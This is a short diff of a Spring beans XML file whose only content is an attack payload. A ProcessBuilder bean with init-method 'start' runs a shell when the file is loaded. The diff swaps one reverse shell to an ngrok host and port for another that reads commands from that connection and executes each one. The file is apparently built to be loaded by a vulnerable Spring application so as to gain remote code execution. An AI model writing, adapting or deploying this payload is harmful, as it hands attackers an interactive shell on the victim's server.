@@ -1,15 +1,20 @@
-<?xml version="1.0" encoding="UTF-8" ?>
-    <beans xmlns="http://www.springframework.org/schema/beans"
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-       xsi:schemaLocation="
-     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
-            <constructor-arg>
+       xsi:schemaLocation="http://www.springframework.org/schema/beans 
+           http://www.springframework.org/schema/beans/spring-beans.xsd">
+
+    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
             <list>
                 <value>sh</value>
                 <value>-c</value>
-                <value><![CDATA[sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/19271 0>&1]]></value>
+                <value>
+                    <![CDATA[
+                    exec 5<>/dev/tcp/0.tcp.ap.ngrok.io/19271;cat <&5 | while read line; do $line 2>&5 >&5; done
+                    ]]>
+                </value>
             </list>
-            </constructor-arg>
-        </bean>
-    </beans>
+        </constructor-arg>
+    </bean>
+</beans>
